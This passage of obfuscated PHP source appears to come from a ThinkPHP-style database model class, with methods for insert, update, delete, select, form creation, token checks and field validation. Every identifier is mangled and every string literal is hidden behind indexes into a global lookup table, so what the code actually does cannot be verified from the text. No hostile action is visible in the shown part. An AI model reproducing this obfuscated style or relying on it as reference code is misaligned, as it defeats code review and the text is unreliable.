(think_config($óùÈÀŞŠ[322])) { $¦‡şÂş = $this->dbName ? $this->dbName : think_config($óùÈÀŞŠ[323]); think_var_cache($óùÈÀŞŠ[324] . strtolower(get_path_this($¦‡şÂş) . $óùÈÀŞŠ[10] . $this->name), $this->fields); } } public function switchModel($Â¼àèğ›, $„ÑÖöÀé = array()) { $ù¾ƒşİ =& $_SERVER[íïàËŸë]; $ìÚ Ãå± = ucwords(strtolower($Â¼àèğ›)) . $ù¾ƒşİ[330]; if (!class_exists($ìÚ Ãå±)) { think_exception($ìÚ Ãå± . think_lang($ù¾ƒşİ[331])); } $this->_extModel = new $ìÚ Ãå±($this->name); if (!empty($„ÑÖöÀé)) { foreach ($„ÑÖöÀé as $İ˜‹…â) { $this->_extModel->setProperty($İ˜‹…â, $this->{$İ˜‹…â}); } } return $this->_extModel; } public function __set($««À÷¹¢, $Ş²ÄÍé) { $this->data[$««À÷¹¢] = $Ş²ÄÍé; } public function __get($ê“·) { return isset($this->data[$ê“·]) ? $this->data[$ê“·] : null; } public function __isset($™»½×·) { return isset($this->data[$™»½×·]); } public function __unset($ã¼şÀú) { unset($this->data[$ã¼şÀú]); } public function __call($ÂêË—·’, $äµ¼ãªÌ) { $ê‹šù× =& $_SERVER[íïàËŸë]; if (in_array(strtolower($ÂêË—·’), $this->methods, !0)) { $this->options[strtolower($ÂêË—·’)] = $äµ¼ãªÌ[0]; return $this; } elseif (in_array(strtolower($ÂêË—·’), array($ê‹šù×[332], $ê‹šù×[333], $ê‹šù×[334], $ê‹šù×[335], $ê‹šù×[336]), !0)) { $õ§à¼áŞ = isset($äµ¼ãªÌ[0]) ? $äµ¼ãªÌ[0] : $ê‹šù×[220]; $õ§à¼áŞ = $this->db->parseKey($õ§à¼áŞ); return $this->getField(strtoupper($ÂêË—·’) . $ê‹šù×[337] . $õ§à¼áŞ . $ê‹šù×[338] . $ÂêË—·’, $ê‹šù×[332]); } elseif (strtolower(substr($ÂêË—·’, 0, 5)) == $ê‹šù×[339]) { $õ§à¼áŞ = think_parse_name(substr($ÂêË—·’, 5)); $Ú÷¸ı“î[$õ§à¼áŞ] = $äµ¼ãªÌ[0]; return $this->where($Ú÷¸ı“î)->find(); } elseif (strtolower(substr($ÂêË—·’, 0, 10)) == $ê‹šù×[340]) { $ëµáè²ì = think_parse_name(substr($ÂêË—·’, 10)); $Ú÷¸ı“î[$ëµáè²ì] = $äµ¼ãªÌ[0]; return $this->where($Ú÷¸ı“î)->getField($äµ¼ãªÌ[1]); } elseif (isset($this->_scope[$ÂêË—·’])) { return $this->scope($ÂêË—·’, $äµ¼ãªÌ[0]); } elseif (method_exists($this, $ÂêË—·’)) { array_unshift($äµ¼ãªÌ, $ÂêË—·’); return call_user_func_array(array($this, $ê‹šù×[341]), $äµ¼ãªÌ); } else { return call_user_func_array(array(parent, $ÂêË—·’), $äµ¼ãªÌ); } } protected function call() { $¦â–•÷Ø =& $_SERVER[íïàËŸë]; $ôéãÙé = func_get_args(); $ŞÜ¼¹’ = array_shift($ôéãÙé); $ÁéÌé¶Á = $ŞÜ¼¹’; if (is_array($ŞÜ¼¹’)) { $ÁéÌé¶Á = $ŞÜ¼¹’[1]; $ŞÜ¼¹’ = $ŞÜ¼¹’[0]; } $²è¦œ› = count($ôéãÙé) - 1; if (isset($ôéãÙé[$²è¦œ›]) && $ôéãÙé[$²è¦œ›] === $ŞÜ¼¹’) { think_exception(__CLASS__ . $¦â–•÷Ø[4] . $ŞÜ¼¹’ . think_lang($¦â–•÷Ø[342])); return; } $ôéãÙé[] = $ŞÜ¼¹’; if (method_exists($this, $¦â–•÷Ø[343])) { $¯ßñˆÎ° = call_user_func_array(array($this, $¦â–•÷Ø[344]), array($ÁéÌé¶Á, $ôéãÙé)); if (!is_null($¯ßñˆÎ°) && $¯ßñˆÎ° !== !1) { return $¯ßñˆÎ°; } } $É±ÂÓì = call_user_func_array(array($this, $ŞÜ¼¹’), $ôéãÙé); if (method_exists($this, $¦â–•÷Ø[345])) { $¯ßñˆÎ° = call_user_func_array(array($this, $¦â–•÷Ø[346]), array($ÁéÌé¶Á, $ôéãÙé, $É±ÂÓì)); if ($¯ßñˆÎ°) { return $¯ßñˆÎ°; } } return $É±ÂÓì; } protected function _initialize() { } protected function _facade($×Ì…„‡) { $ßüÒ£¥“ =& $_SERVER[íïàËŸë]; if (!empty($this->fields)) { foreach ($×Ì…„‡ as $ü¤Òâ¸ó => $âæ»İıê) { if (is_array($this->fields) && !in_array($ü¤Òâ¸ó, $this->fields, !0)) { unset($×Ì…„‡[$ü¤Òâ¸ó]); } elseif (is_scalar($âæ»İıê)) { $this->_parseType($×Ì…„‡, $ü¤Òâ¸ó); } } } if (!empty($this->options[$ßüÒ£¥“[347]])) { $×Ì…„‡ = array_map($this->options[$ßüÒ£¥“[347]], $×Ì…„‡); unset($this->options[$ßüÒ£¥“[347]]); } $this->_beforeWrite($×Ì…„‡); return $×Ì…„‡; } protected function _beforeWrite(&$‡Úºû§Ş) { } public function add($½ƒ½å— = '', $¦“®Ó¶Ò = array(), $ÙÄàøëÊ = false) { if (empty($½ƒ½å—)) { if (!empty($this->data)) { $½ƒ½å— = $this->data; $this->data = array(); } else { $this->error = think_lang($_SERVER[íïàËŸë][348]); return !1; } } $¦“®Ó¶Ò = $this->_parseOptions($¦“®Ó¶Ò); $½ƒ½å— = $this->_facade($½ƒ½å—); if (!1 === $this->_beforeInsert($½ƒ½å—, $¦“®Ó¶Ò)) { return !1; } $¿‘¯á£Ù = $this->db->insert($½ƒ½å—, $¦“®Ó¶Ò, $ÙÄàøëÊ); if (!1 !== $¿‘¯á£Ù) { $·Ä‘¼ßŞ = $this->getLastInsID(); if ($·Ä‘¼ßŞ) { $½ƒ½å—[$this->getPk()] = $·Ä‘¼ßŞ; $this->_after_insert($½ƒ½å—, $¦“®Ó¶Ò); return $·Ä‘¼ßŞ; } $this->_after_insert($½ƒ½å—, $¦“®Ó¶Ò); } return $¿‘¯á£Ù; } protected function _beforeInsert(&$à­ŞìŠ, $ôš ı÷) { } protected function _after_insert($³ÙÚùâª, $û×º­–£) { } public function addAll($ãÙ•´š, $Í•ÇÊ³È = array(), $ŠÒ½÷éˆ = false) { $™œ²õô¹ =& $_SERVER[íïàËŸë]; if (empty($ãÙ•´š)) { $this->error = think_lang($™œ²õô¹[348]); return !1; } $Í•ÇÊ³È = $this->_parseOptions($Í•ÇÊ³È); foreach ($ãÙ•´š as $ı À«à => $±˜•š­À) { $ãÙ•´š[$ı À«à] = $this->_facade($±˜•š­À); } if (method_exists($this->db, $™œ²õô¹[349])) { $Àã­´Ö = $this->db->insertAll($ãÙ•´š, $Í•ÇÊ³È, $ŠÒ½÷éˆ); } else { $this->startTrans(); foreach ($ãÙ•´š as $ı À«à => $±˜•š­À) { $Àã­´Ö = $this->db->insert($±˜•š­À, $Í•ÇÊ³È, $ŠÒ½÷éˆ); } $this->commit(); } if (!1 !== $Àã­´Ö) { $ÄÖæè” = $this->getLastInsID(); if ($ÄÖæè”) { return $ÄÖæè”; } } return $Àã­´Ö; } public function selectAdd($Âõ¬ŠçÛ = '', $¾È¡òÌâ = '', $³Üâô¾ = array()) { $ƒâÂ¯¸ì =& $_SERVER[íïàËŸë]; $³Üâô¾ = $this->_parseOptions($³Üâô¾); if (!1 === ($Ò§¾¬ıı = $this->db->selectInsert($Âõ¬ŠçÛ ? $Âõ¬ŠçÛ : $³Üâô¾[$ƒâÂ¯¸ì[350]], $¾È¡òÌâ ? $¾È¡òÌâ : $this->getTableName(), $³Üâô¾))) { $this->error = think_lang($ƒâÂ¯¸ì[351]); return !1; } else { return $Ò§¾¬ıı; } } public function save($ÍƒÄİÅ„ = '', $–Í›ŞÈ± = array()) { $»Ø³âé =& $_SERVER[íïàËŸë]; if (empty($ÍƒÄİÅ„)) { if (!empty($this->data)) { $ÍƒÄİÅ„ = $this->data; $this->data = array(); } else { $this->error = think_lang($»Ø³âé[348]); return !1; } } $ÍƒÄİÅ„ = $this->_facade($ÍƒÄİÅ„); $–Í›ŞÈ± = $this->_parseOptions($–Í›ŞÈ±); $œ¦…Î = $this->getPk(); if (!isset($–Í›ŞÈ±[$»Ø³âé[352]])) { if (isset($ÍƒÄİÅ„[$œ¦…Î])) { $òü§›·ã[$œ¦…Î] = $ÍƒÄİÅ„[$œ¦…Î]; $–Í›ŞÈ±[$»Ø³âé[352]] = $òü§›·ã; unset($ÍƒÄİÅ„[$œ¦…Î]); } else { $this->error = think_lang($»Ø³âé[351]); return !1; } } if (is_array($–Í›ŞÈ±[$»Ø³âé[352]]) && isset($–Í›ŞÈ±[$»Ø³âé[352]][$œ¦…Î])) { $óœïö£ù = $–Í›ŞÈ±[$»Ø³âé[352]][$œ¦…Î]; } if (!1 === $this->_beforeUpdate($ÍƒÄİÅ„, $–Í›ŞÈ±)) { return !1; } $õñ£áÊ = $this->db->update($ÍƒÄİÅ„, $–Í›ŞÈ±); if (!1 !== $õñ£áÊ) { if (isset($óœïö£ù)) { $ÍƒÄİÅ„[$œ¦…Î] = $óœïö£ù; } $this->_afterUpdate($ÍƒÄİÅ„, $–Í›ŞÈ±); } return $õñ£áÊ; } protected function _beforeUpdate(&$Èù§Ì™¯, $š¡Â†µö) { } protected function _afterUpdate($²ÂÀšÈ, $¦Û÷¬ÖÅ) { } public function delete($–”®¸öô = array()) { $ÀÎ‚ìÅ¢ =& $_SERVER[íïàËŸë]; if (empty($–”®¸öô) && empty($this->options[$ÀÎ‚ìÅ¢[352]])) { if (!empty($this->data) && isset($this->data[$this->getPk()])) { return $this->delete($this->data[$this->getPk()]); } else { return !1; } } $Å¼š¯ = $this->getPk(); if (is_numeric($–”®¸öô) || is_string($–”®¸öô)) { if (strpos($–”®¸öô, $ÀÎ‚ìÅ¢[50])) { $µñ©×Ëë[$Å¼š¯] = array($ÀÎ‚ìÅ¢[353], $–”®¸öô); } else { $µñ©×Ëë[$Å¼š¯] = $–”®¸öô; } $this->options[$ÀÎ‚ìÅ¢[352]] = $µñ©×Ëë; } $–”®¸öô = $this->_parseOptions(); if (is_array($–”®¸öô[$ÀÎ‚ìÅ¢[352]]) && isset($–”®¸öô[$ÀÎ‚ìÅ¢[352]][$Å¼š¯])) { $ü„ÙûÛÖ = $–”®¸öô[$ÀÎ‚ìÅ¢[352]][$Å¼š¯]; } $İ–¡ğ…­ = $this->db->delete($–”®¸öô); if (!1 !== $İ–¡ğ…­) { $şãî’¦ï = array(); if (isset($ü„ÙûÛÖ)) { $şãî’¦ï[$Å¼š¯] = $ü„ÙûÛÖ; } $this->_after_delete($şãî’¦ï, $–”®¸öô); } return $İ–¡ğ…­; } protected function _after_delete($çßæ¨³Œ, $şóç¸Ş) { } public function select($ğéÎÇ = array()) { $Æš†Ã·Ş =& $_SERVER[íïàËŸë]; if (is_string($ğéÎÇ) || is_numeric($ğéÎÇ)) { $²ğæô¥ú = $this->getPk(); if (strpos($ğéÎÇ, $Æš†Ã·Ş[50])) { $î„ß–°•[$²ğæô¥ú] = array($Æš†Ã·Ş[353], $ğéÎÇ); } else { $î„ß–°•[$²ğæô¥ú] = $ğéÎÇ; } $this->options[$Æš†Ã·Ş[352]] = $î„ß–°•; } elseif (!1 === $ğéÎÇ) { $ğéÎÇ = $this->_parseOptions(); return $Æš†Ã·Ş[354] . $this->db->buildSelectSql($ğéÎÇ) . $Æš†Ã·Ş[355]; } $ğéÎÇ = $this->_parseOptions(); $ã¤™Ş­Ö = $this->db->select($ğéÎÇ); if (!1 === $ã¤™Ş­Ö) { return !1; } if (empty($ã¤™Ş­Ö)) { return null; } $this->_afterSelect($ã¤™Ş­Ö, $ğéÎÇ); return $ã¤™Ş­Ö; } protected function _afterSelect(&$‹¹ğÙ¯¾, $ãÄ­Ö¦Ì) { } public function buildSql($Ş¨ï©Å¬ = array()) { $â“è¦ß× =& $_SERVER[íïàËŸë]; $Ş¨ï©Å¬ = $this->_parseOptions($Ş¨ï©Å¬); return $â“è¦ß×[354] . $this->db->buildSelectSql($Ş¨ï©Å¬) . $â“è¦ß×[355]; } public function optionsValue($¥óÆÈöÂ = null) { if (is_null($¥óÆÈöÂ)) { return $this->options; } elseif (is_array($¥óÆÈöÂ)) { $this->options = array_merge($this->options, $¥óÆÈöÂ); } } protected function _parseOptions($¾´ïàØ· = array()) { $‚ş­ô¶§ =& $_SERVER[íïàËŸë]; if (is_array($¾´ïàØ·)) { $¾´ïàØ· = array_merge($this->options, $¾´ïàØ·); } $this->options = array(); if (!isset($¾´ïàØ·[$‚ş­ô¶§[356]])) { $¾´ïàØ·[$‚ş­ô¶§[356]] = $this->getTableName(); $¾¹ú¸ = $this->fields; } else { $¾¹ú¸ = $this->getDbFields(); } if (!empty($¾´ïàØ·[$‚ş­ô¶§[357]])) { $¾´ïàØ·[$‚ş­ô¶§[356]] .= $‚ş­ô¶§[53] . $¾´ïàØ·[$‚ş­ô¶§[357]]; } $¾´ïàØ·[$‚ş­ô¶§[358]] = $this->name; if (isset($¾´ïàØ·[$‚ş­ô¶§[352]]) && is_array($¾´ïàØ·[$‚ş­ô¶§[352]]) && !empty($¾¹ú¸) && !isset($¾´ïàØ·[$‚ş­ô¶§[359]]) && !isset($¾´ïàØ·[$‚ş­ô¶§[356]])) { foreach ($¾´ïàØ·[$‚ş­ô¶§[352]] as $ÆšÀˆöè => $Ôù±“’¥) { $ÆšÀˆöè = trim($ÆšÀˆöè); if (in_array($ÆšÀˆöè, $¾¹ú¸, !0)) { if (is_scalar($Ôù±“’¥)) { $this->_parseType($¾´ïàØ·[$‚ş­ô¶§[352]], $ÆšÀˆöè); } } elseif (!is_numeric($ÆšÀˆöè) && $‚ş­ô¶§[11] != substr($ÆšÀˆöè, 0, 1) && !1 === strpos($ÆšÀˆöè, $‚ş­ô¶§[10]) && !1 === strpos($ÆšÀˆöè, $‚ş­ô¶§[337]) && !1 === strpos($ÆšÀˆöè, $‚ş­ô¶§[214]) && !1 === strpos($ÆšÀˆöè, $‚ş­ô¶§[360])) { unset($¾´ïàØ·[$‚ş­ô¶§[352]][$ÆšÀˆöè]); } } } $this->_options_filter($¾´ïàØ·); return $¾´ïàØ·; } protected function _options_filter(&$¬Š¶¸”Ê) { } protected function _parseType(&$ó©¨¨’¨, $½Ê•ãŸ—) { $›ÆÂğùŞ =& $_SERVER[íïàËŸë]; if (empty($this->options[$›ÆÂğùŞ[361]][$›ÆÂğùŞ[4] . $½Ê•ãŸ—])) { $ç„ë­¢ = strtolower($this->fields[$›ÆÂğùŞ[329]][$½Ê•ãŸ—]); if (!1 !== strpos($ç„ë­¢, $›ÆÂğùŞ[362])) { } elseif (!1 === strpos($ç„ë­¢, $›ÆÂğùŞ[363]) && !1 !== strpos($ç„ë­¢, $›ÆÂğùŞ[364])) { $ó©¨¨’¨[$½Ê•ãŸ—] = intval($ó©¨¨’¨[$½Ê•ãŸ—]); } elseif (!1 !== strpos($ç„ë­¢, $›ÆÂğùŞ[365]) || !1 !== strpos($ç„ë­¢, $›ÆÂğùŞ[366])) { $ó©¨¨’¨[$½Ê•ãŸ—] = floatval($ó©¨¨’¨[$½Ê•ãŸ—]); } elseif (!1 !== strpos($ç„ë­¢, $›ÆÂğùŞ[367])) { $ó©¨¨’¨[$½Ê•ãŸ—] = (bool) $ó©¨¨’¨[$½Ê•ãŸ—]; } } } public function find($ıÇµáóò = array()) { $®Ûˆæ¥ =& $_SERVER[íïàËŸë]; if (is_numeric($ıÇµáóò) || is_string($ıÇµáóò)) { $­û×…à‹[$this->getPk()] = intval($ıÇµáóò); $this->options[$®Ûˆæ¥[352]] = $­û×…à‹; } $this->options[$®Ûˆæ¥[368]] = 1; $ıÇµáóò = $this->_parseOptions(); $ÎÖ¥©Ğ« = $this->db->select($ıÇµáóò); if (!1 === $ÎÖ¥©Ğ«) { return !1; } if (empty($ÎÖ¥©Ğ«)) { return null; } $this->data = $ÎÖ¥©Ğ«[0]; $this->_afterFind($this->data, $ıÇµáóò); if (!empty($this->options[$®Ûˆæ¥[369]])) { return $this->returnResult($this->data, $this->options[$®Ûˆæ¥[369]]); } return $this->data; } protected function _afterFind(&$òŒĞñáÑ, $ü×Õ¨˜—) { } protected function returnResult($»Óú£Ü¹, $Ç¶‘¿Ğş = '') { $Åîô¾¸ =& $_SERVER[íïàËŸë]; if ($Ç¶‘¿Ğş) { if (is_callable($Ç¶‘¿Ğş)) { return call_user_func($Ç¶‘¿Ğş, $»Óú£Ü¹); } switch (strtolower($Ç¶‘¿Ğş)) { case $Åîô¾¸[370]: return json_encode($»Óú£Ü¹); case $Åîô¾¸[371]: return xml_encode($»Óú£Ü¹); } } return $»Óú£Ü¹; } public function parseFieldsMap($üßì”©æ, $åÑ·«¬ = 1) { if (!empty($this->_map)) { foreach ($this->_map as $¥„¼£“ => $Ùı¡ ¹õ) { if ($åÑ·«¬ == 1) { if (isset($üßì”©æ[$Ùı¡ ¹õ])) { $üßì”©æ[$¥„¼£“] = $üßì”©æ[$Ùı¡ ¹õ]; unset($üßì”©æ[$Ùı¡ ¹õ]); } } else { if (isset($üßì”©æ[$¥„¼£“])) { $üßì”©æ[$Ùı¡ ¹õ] = $üßì”©æ[$¥„¼£“]; unset($üßì”©æ[$¥„¼£“]); } } } } return $üßì”©æ; } public function setField($Ç¾°ŸØ, $š…–òâ = '') { if (is_array($Ç¾°ŸØ)) { $›¥„ç¨û = $Ç¾°ŸØ; } else { $›¥„ç¨û[$Ç¾°ŸØ] = $š…–òâ; } return $this->save($›¥„ç¨û); } public function setAdd($Æß§±’, $·‘÷õ» = 1) { $ÖÉÓØÄÏ =& $_SERVER[íïàËŸë]; $›€‚İş = $Æß§±’ . $ÖÉÓØÄÏ[372] . $·‘÷õ»; if ($·‘÷õ» < 0) { $›€‚İş = $Æß§±’ . $·‘÷õ»; } return $this->setField($Æß§±’, array($ÖÉÓØÄÏ[373], $›€‚İş)); } public function getField($ªŠÀäÁÒ, $œªïœàĞ = null) { $ñ–Êí¿ =& $_SERVER[íïàËŸë]; $ª×‹’ì[$ñ–Êí¿[350]] = $ªŠÀäÁÒ; $ª×‹’ì = $this->_parseOptions($ª×‹’ì); $ªŠÀäÁÒ = trim($ªŠÀäÁÒ); if (strpos($ªŠÀäÁÒ, $ñ–Êí¿[50])) { if (!isset($ª×‹’ì[$ñ–Êí¿[368]])) { $ª×‹’ì[$ñ–Êí¿[368]] = is_numeric($œªïœàĞ) ? $œªïœàĞ : $ñ–Êí¿[12]; } $ü­¡Ùì” = $this->db->select($ª×‹’ì); if (!empty($ü­¡Ùì”)) { $„Ê¶ğé = explode($ñ–Êí¿[50], $ªŠÀäÁÒ); $ªŠÀäÁÒ = array_keys($ü­¡Ùì”[0]); $öÜåô¿« = array_shift($ªŠÀäÁÒ); $­—÷èù™ = array_shift($ªŠÀäÁÒ); $ŞĞ¦àÉ€ = array(); $ş°‚˜Œ³ = count($„Ê¶ğé); foreach ($ü­¡Ùì” as $şéÍŸŸ©) { $ì¤Ñúƒ– = $şéÍŸŸ©[$öÜåô¿«]; if (2 == $ş°‚˜Œ³) { $ŞĞ¦àÉ€[$ì¤Ñúƒ–] = $şéÍŸŸ©[$­—÷èù™]; } else { $ŞĞ¦àÉ€[$ì¤Ñúƒ–] = is_string($œªïœàĞ) ? implode($œªïœàĞ, $şéÍŸŸ©) : $şéÍŸŸ©; } } return $ŞĞ¦àÉ€; } } else { if (!0 !== $œªïœàĞ) { $ª×‹’ì[$ñ–Êí¿[368]] = is_numeric($œªïœàĞ) ? $œªïœàĞ : 1; } if ($œªïœàĞ === $ñ–Êí¿[332]) { unset($ª×‹’ì[$ñ–Êí¿[368]]); } $şéÍŸŸ© = $this->db->select($ª×‹’ì); if (!empty($şéÍŸŸ©)) { if ($œªïœàĞ === $ñ–Êí¿[332]) { return reset($şéÍŸŸ©[0]); } if (!0 !== $œªïœàĞ && 1 == $ª×‹’ì[$ñ–Êí¿[368]]) { return reset($şéÍŸŸ©[0]); } foreach ($şéÍŸŸ© as $ˆ’ØˆØ) { $¥È§ÈÑ[] = $ˆ’ØˆØ[$ªŠÀäÁÒ]; } return $¥È§ÈÑ; } } return null; } public function create($ÊÙ‘¨Šª = '', $÷½÷Úïî = '') { $é–£÷”¡ =& $_SERVER[íïàËŸë]; if (empty($ÊÙ‘¨Šª)) { $ÊÙ‘¨Šª = $_POST; } elseif (is_object($ÊÙ‘¨Šª)) { $ÊÙ‘¨Šª = get_object_vars($ÊÙ‘¨Šª); } if (empty($ÊÙ‘¨Šª) || !is_array($ÊÙ‘¨Šª)) { $this->error = think_lang($é–£÷”¡[348]); return !1; } $ÊÙ‘¨Šª = $this->parseFieldsMap($ÊÙ‘¨Šª, 0); $÷½÷Úïî = $÷½÷Úïî ? $÷½÷Úïî : (!empty($ÊÙ‘¨Šª[$this->getPk()]) ? THINK_MODEL_UPDATE : THINK_MODEL_INSERT); if (isset($this->options[$é–£÷”¡[350]])) { $ ÅÓƒ = $this->options[$é–£÷”¡[350]]; unset($this->options[$é–£÷”¡[350]]); } elseif ($÷½÷Úïî == THINK_MODEL_INSERT && isset($this->insertFields)) { $ ÅÓƒ = $this->insertFields; } elseif ($÷½÷Úïî == THINK_MODEL_UPDATE && isset($this->updateFields)) { $ ÅÓƒ = $this->updateFields; } if (isset($ ÅÓƒ)) { if (is_string($ ÅÓƒ)) { $ ÅÓƒ = explode($é–£÷”¡[50], $ ÅÓƒ); } if (think_config($é–£÷”¡[374])) { $ ÅÓƒ[] = think_config($é–£÷”¡[375]); } foreach ($ÊÙ‘¨Šª as $Ê€ªĞœò => $ìŸÂÂš) { if (!in_array($Ê€ªĞœò, $ ÅÓƒ)) { unset($ÊÙ‘¨Šª[$Ê€ªĞœò]); } } } if (!$this->autoValidation($ÊÙ‘¨Šª, $÷½÷Úïî)) { return !1; } if (!$this->autoCheckToken($ÊÙ‘¨Šª)) { $this->error = think_lang($é–£÷”¡[376]); return !1; } if ($this->autoCheckFields) { $ ÅÓƒ = $this->getDbFields(); foreach ($ÊÙ‘¨Šª as $Ê€ªĞœò => $ìŸÂÂš) { if (!in_array($Ê€ªĞœò, $ ÅÓƒ)) { unset($ÊÙ‘¨Šª[$Ê€ªĞœò]); } elseif (MAGIC_QUOTES_GPC && is_string($ìŸÂÂš)) { $ÊÙ‘¨Šª[$Ê€ªĞœò] = stripslashes($ìŸÂÂš); } } } $this->autoOperation($ÊÙ‘¨Šª, $÷½÷Úïî); $this->data = $ÊÙ‘¨Šª; return $ÊÙ‘¨Šª; } public function autoCheckToken($ô«Í€œ) { $”äÒßúš =& $_SERVER[íïàËŸë]; if (isset($this->options[$”äÒßúš[377]]) && !$this->options[$”äÒßúš[377]]) { return !0; } if (think_config($”äÒßúš[374])) { $§ÒÇçº¾ = think_config($”äÒßúš[375]); if (!isset($ô«Í€œ[$§ÒÇçº¾]) || Session::get($§ÒÇçº¾)) { return !1; } list($£»—êË‹, $¬ø–÷Ë¿) = explode($”äÒßúš[11], $ô«Í€œ[$§ÒÇçº¾]); if ($¬ø–÷Ë¿ && Session::get($§ÒÇçº¾ . $”äÒßúš[10] . $£»—êË‹) === $¬ø–÷Ë¿) { Session::remove($§ÒÇçº¾ . $”äÒßúš[10] . $£»—êË‹); return !0; } if (think_config($”äÒßúš[378])) { Session::remove($§ÒÇçº¾ . $”äÒßúš[10] . $£»—êË‹); } return !1; } return !0; } public function regex($é†ËšÛ˜, $î§‡·ÌÖ) { $ùí”İø =& $_SERVER[íïàËŸë]; $Ä—èœÈÛ = array($ùí”İø[379] => $ùí”İø[380], $ùí”İø[381] => $ùí”İø[382], $ùí”İø[383] => $ùí”İø[384], $ùí”İø[385] => $ùí”İø[386], $ùí”İø[387] => $ùí”İø[388], $ùí”İø[389] => $ùí”İø[390], $ùí”İø[391] => $ùí”İø[392], $ùí”İø[366] => $ùí”İø[393], $ùí”İø[394] => $ùí”İø[395]); if (isset($Ä—èœÈÛ[strtolower($î§‡·ÌÖ)])) { $î§‡·ÌÖ = $Ä—èœÈÛ[strtolower($î§‡·ÌÖ)]; } return preg_match($î§‡·ÌÖ, $é†ËšÛ˜) === 1; } private function autoOperation(&$ŞÀù—Ïâ, $Õ¦ËÓú) { $°àÄë¤º =& $_SERVER[íïàËŸë]; if (!empty($this->options[$°àÄë¤º[396]])) { $š‰ÏĞõ§ = $this->options[$°àÄë¤º[396]]; unset($this->options[$°àÄë¤º[396]]); } elseif (!empty($this->_auto)) { $š‰ÏĞõ§ = $this->_auto; } if (isset($š‰ÏĞõ§)) { foreach ($š‰ÏĞõ§ as $Œá¢©•­) { if (empty($Œá¢©•­[2])) { $Œá¢©•­[2] = THINK_MODEL_INSERT; } if ($Õ¦ËÓú == $Œá¢©•­[2] || $Œá¢©•­[2] == THINK_MODEL_BOTH) { switch (trim($Œá¢©•­[3])) { case $°àÄë¤º[397]: case $°àÄë¤º[398]: $ì£’ù­ş = isset($Œá¢©•­[4]) ? (array) $Œá¢©•­[4] : array(); if (isset($ŞÀù—Ïâ[$Œá¢©•­[0]])) { array_unshift($ì£’ù­ş, $ŞÀù—Ïâ[$Œá¢©•­[0]]); } if ($°àÄë¤º[397] == $Œá¢©•­[3]) { $ŞÀù—Ïâ[$Œá¢©•­[0]] = call_user_func_array($Œá¢©•­[1], $ì£’ù­ş); } else { $ŞÀù—Ïâ[$Œá¢©•­[0]] = call_user_func_array(array(&$this, $Œá¢©•­[1]), $ì£’ù­ş); } break; case $°àÄë¤º[350]: $ŞÀù—Ïâ[$Œá¢©•­[0]] = $ŞÀù—Ïâ[$Œá¢©•­[1]]; break; case $°àÄë¤º[399]: if ($°àÄë¤º[12] === $ŞÀù—Ïâ[$Œá¢©•­[0]]) { unset($ŞÀù—Ïâ[$Œá¢©•­[0]]); } break; case $°àÄë¤º[400]: default: $ŞÀù—Ïâ[$Œá¢©•­[0]] = $Œá¢©•­[1]; } if (!1 === $ŞÀù—Ïâ[$Œá¢©•­[0]]) { unset($ŞÀù—Ïâ[$Œá¢©•­[0]]); } } } } return $ŞÀù—Ïâ; } protected function autoValidation($ºÜªÜÃ«, $‘ÂäÎøß) { $™À¥œ±± =& $_SERVER[íïàËŸë]; if (!empty($this->options[$™À¥œ±±[401]])) { $üŒÆæˆ = $this->options[$™À¥œ±±[401]]; unset($this->options[$™À¥œ±±[401]]); } elseif (!empty($this->_validate)) { $üŒÆæˆ = $this->_validate; } if (isset($üŒÆæˆ)) { if ($this->patchValidate) { $this->error = array(); } foreach ($üŒÆæˆ as $„È–²ƒ‰ => $®‰†­‡Ï) { if (empty($®‰†­‡Ï[5]) || $®‰†­‡Ï[5] == THINK_MODEL_BOTH || $®‰†­‡Ï[5] == $‘ÂäÎøß) { if (0 == strpos($®‰†­‡Ï[2], $™À¥œ±±[402]) && strpos($®‰†­‡Ï[2], $™À¥œ±±[403])) { $®‰†­‡Ï[2] = think_lang(substr($®‰†­‡Ï[2], 2, -1)); } $®‰†­‡Ï[3] = isset($®‰†­‡Ï[3]) ? $®‰†­‡Ï[3] : THINK_EXISTS_VALIDATE; $®‰†­‡Ï[4] = isset($®‰†­‡Ï[4]) ? $®‰†­‡Ï[4] : $™À¥œ±±[404]; switch ($®‰†­‡Ï[3]) { case THINK_MUST_VALIDATE: if (!1 === $this->_validationField($ºÜªÜÃ«, $®‰†­‡Ï)) { return !1; } break; case THINK_VALUE_VALIDATE: if ($™À¥œ±±[12] != trim($ºÜªÜÃ«[$®‰†­‡Ï[0]])) { if (!1 === $this->_validationField($ºÜªÜÃ«, $®‰†­‡Ï)) { return !1; } } break; default: if (isset($ºÜªÜÃ«[$®‰†­‡Ï[0]])) { if (!1 === $this->_validationField($ºÜªÜÃ«, $®‰†­‡Ï)) { return !1; } } } } } if (!empty($this->error)) { return !1; } } return !0; } protected function _validationField($Åƒ¤í·„, $™ÄóŸ‘×) { if (!1 === $this->_validationFieldItem($Åƒ¤í·„, $™ÄóŸ‘×)) { if ($this->patchValidate) { $this->error[$™ÄóŸ‘×[0]] = $™ÄóŸ‘×[2]; } else { $this->error = $™ÄóŸ‘×[2]; return !1; } } return; } protected function _validationFieldItem($Á˜ÈúÕ, $ú¢ªÈØ) { $ŸÛµ«¯‚ =& $_SERVER[íïàËŸë]; switch (strtolower(trim($ú¢ªÈØ[4]))) { case $ŸÛµ«¯‚[397]: case $ŸÛµ«¯‚[398]: $®ııÓî’ = isset($ú¢ªÈØ[6]) ? (array) $ú¢ªÈØ[6] : array(); if (is_string($ú¢ªÈØ[0]) && strpos($ú¢ªÈØ[0], $ŸÛµ«¯‚[50])) { $ú¢ªÈØ[0] = explode($ŸÛµ«¯‚[50], $ú¢ªÈØ[0]); } if (is_array($ú¢ªÈØ[0])) { foreach ($ú¢ªÈØ[0] as $—öå¯è) { $„˜ğµ°È[$—öå¯è] = $Á˜ÈúÕ[$—öå¯è]; } array_unshift($®ııÓî’, $„˜ğµ°È); } else { array_unshift($®ııÓî’, $Á˜ÈúÕ[$ú¢ªÈØ[0]]); } if ($ŸÛµ«¯‚[397] == $ú¢ªÈØ[4]) { return call_user_func_array($ú¢ªÈØ[1], $®ııÓî’); } else { return call_user_func_array(array(&$this, $ú¢ªÈØ[1]), $®ııÓî’); } case $ŸÛµ«¯‚[405]: return $Á˜ÈúÕ[$ú¢ªÈØ[0]] == $Á˜ÈúÕ[$ú¢ªÈØ[1]]; case $ŸÛµ«¯‚[406]: if (is_string($ú¢ªÈØ[0]) && strpos($ú¢ªÈØ[0], $ŸÛµ«¯‚[50])) { $ú¢ªÈØ[0] = explode($ŸÛµ«¯‚[50], $ú¢ªÈØ[0]); } $ÂÒè÷Î = array(); if (is_array($ú¢ªÈØ[0])) { foreach ($ú¢ªÈØ[0] as $—öå¯è) { 